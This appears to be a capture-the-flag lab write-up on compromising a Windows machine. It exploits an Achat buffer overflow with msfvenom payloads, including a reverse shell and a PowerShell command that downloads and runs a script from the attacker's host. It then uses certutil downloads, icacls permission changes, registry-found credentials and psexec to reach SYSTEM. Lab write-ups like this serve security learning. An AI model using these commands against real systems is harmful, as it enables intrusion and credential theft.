Main steps
1. 

Learning points
1. Downloading and running a PowerShell reverse shell script

`nmap`
![[Pasted image 20260326191752.png]]

Ports open are mostly SMB and RPC related. The other 2 ports returning `tcpwrapped` here are 9255 and 9256.

Port 9256 is the port that `Achat` uses, according to https://www.speedguide.net/port.php?port=9256. This program is vulnerable to a buffer overflow that can lead RCE, CVE-2025-34127.

Found a POC on ExploitDB, and generated a payload with `msfvenom` following the format in the POC, with 
```
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.46 LPORT=4444 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

Tried running the POC with this payload, and managed to get a connection on my `nc` listener, however the session dies immediately.
![[Pasted image 20260326195048.png]]

Seems to be due to the `Achat` service dying whenever this exploit is run.

To get a round this, I generated a payload that ran the Windows command to download a PowerShell reverse shell script from my machine and run it.
```
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.46/powershellrev.ps1')\"" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

Ran the exploit again and managed to get a reverse shell as `alfred`.
![[Pasted image 20260326195707.png]]

`alfred`is able to access the `administrator` desktop, but cannot read the root flag. However, `alfred` does have the following permissions on the `administrator` desktop folder.
![[Pasted image 20260326200228.png]]

I can grant `alfred` full permissions to read the root flag using `icacls root.txt /grant alfred:F` and read the flag.
![[Pasted image 20260326200404.png]]

Alternatively, running the `PowerUp.ps1` script by uploading it with `certutil -urlcache -split -f http://10.10.14.46/PowerUp.ps1` and running it with `powershell -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"` reveals some Autologon credentials in the registry.
![[Pasted image 20260326202141.png]]

`Alfred`:`Welcome1!`

Tried using these credentials to login to the `administrator` account using `impacket-psexec`, and was able to get access as `nt authority\system`.
